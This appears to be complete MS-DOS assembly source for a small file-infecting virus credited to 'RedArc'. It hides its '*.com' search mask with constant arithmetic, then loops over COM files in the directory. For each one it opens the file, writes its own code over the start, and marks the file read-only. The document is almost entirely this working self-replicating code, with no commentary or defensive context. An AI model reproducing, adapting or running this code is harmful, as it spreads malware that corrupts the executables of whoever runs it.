;(c) RedArc
Model Tiny
.code
org 100h

mm1 equ '.*' + 0adh
mm2 equ 'oc' + 0adh
mm3 equ 0006dh + 0adh

start:
       mov di,FMASK    ;LABEL1
       mov ax,mm1
       sub ax,0adh
       stosw
       mov ax,mm2
       sub ax,0adh
       stosw
       mov ax,mm3
       sub ax,0adh
       stosw
;---
       mov ah,4eh
       mov dx,di
       sub dx,6
       mov cx,0
@2:                ;LABEL2
       int 21h
       jnb @3      ;LABEL3
       mov ax,0
       push ax
       ret
@3:                ;LABEL4
       mov ax,3d02h
       mov dx,9eh
       int 21h
       mov bx,ax
       mov ah,3fh
       mov cx,0ffffh
       mov dx,di
       mov bp,dx
       int 21h
       add bp,ax
       sub bp,106h
       mov ax,4200h
       mov cx,0
       mov dx,cx
       int 21h
       mov ah,40h
       mov cx,bp
       mov dx,100h
       int 21h
       mov ah,3eh
       int 21h
       mov ax,4301h
       mov dx,9eh
       mov cx,1
       int 21h
       mov ah,4fh
       mov si,offset [@2] ;LABEL5
       push si
       ret
;---
FMASK equ $-start + 100h
db 6 dup (?)
end start